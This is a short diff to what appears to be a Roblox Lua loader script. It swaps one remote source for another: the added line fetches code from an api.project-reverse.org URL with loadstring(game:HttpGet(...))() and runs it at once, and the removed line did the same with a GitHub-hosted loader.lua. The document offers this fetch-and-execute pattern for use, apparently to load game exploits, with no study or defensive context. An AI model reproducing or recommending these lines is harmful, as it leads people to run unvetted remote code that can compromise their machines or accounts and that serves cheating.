@@ -1,2 +1,1 @@
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjZjOWQxZmM2LTkxODktNDBjMS04ZGZiLTc3ZTdjZWVlMDYzZCIsImtpbmQiOiJsb2FkZXIifQ"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/joshhhie/rise/refs/heads/main/loader.lua"))()
